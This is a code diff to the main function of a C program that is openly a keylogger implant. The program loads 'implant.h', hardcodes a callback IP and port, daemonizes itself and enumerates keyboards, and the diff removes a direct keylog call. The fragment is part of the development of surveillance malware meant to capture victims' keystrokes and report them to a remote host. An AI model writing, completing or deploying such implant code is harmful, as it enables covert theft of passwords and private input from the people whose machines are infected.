@@ -4,22 +4,33 @@
 #include <unistd.h>
 #include "implant.h"
 
-int main(int ac, char **av, __attribute__((unused)) char **envp) {
+int main(
+#ifdef DEBUG
+    int ac,
+    char **av,
+#else
+    __attribute__((unused)) int ac,
+    __attribute__((unused)) char **av,
+#endif
+    __attribute__((unused)) char **envp) {
 
     implant_t instance = {
-        .ip = {0}, .port = 80, /* ip can be a domain name */
+        .ip = {"10.0.2.2"}, .port = 80, /* ip can be a domain name */
     };
 
-    if (ERROR == parse_user_input(ac, av, &instance))
+#ifdef DEBUG
+    if (ERROR == run_lexer(ac, av, &instance))
         return 1;
 
-    daemon_setup();
+    DEBUG_LOG("[*] settings:\n\tIP:%s\n\tPort:%d", instance.ip, instance.port);
+#else
+    /* TODO(djnn): instance_load_from_memory(&instance); */
 
-#ifdef DEBUG
-    DEBUG_LOG("[*] Implant settings:\n\tIP:%s\n\tPort:%d", instance.ip, instance.port);
+    daemon_setup();
 #endif
 
-    fetch_available_keyboards(&instance);
-    keylog(&instance);
+    if (ERROR == fetch_available_keyboards(&instance))
+        return 1;
+
     return 0;
 }
